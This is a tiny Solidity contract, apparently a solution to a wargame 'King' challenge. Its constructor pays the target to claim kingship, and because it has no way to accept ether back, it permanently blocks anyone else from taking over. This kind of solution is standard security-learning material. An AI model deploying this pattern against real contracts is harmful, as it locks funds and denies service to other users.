// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "forge-std/console.sol";

contract KingHack {
    constructor(address payable king) payable {
        (bool success, ) = king.call{value: msg.value}("");
        require(success, "couldn't be king");
    }
}
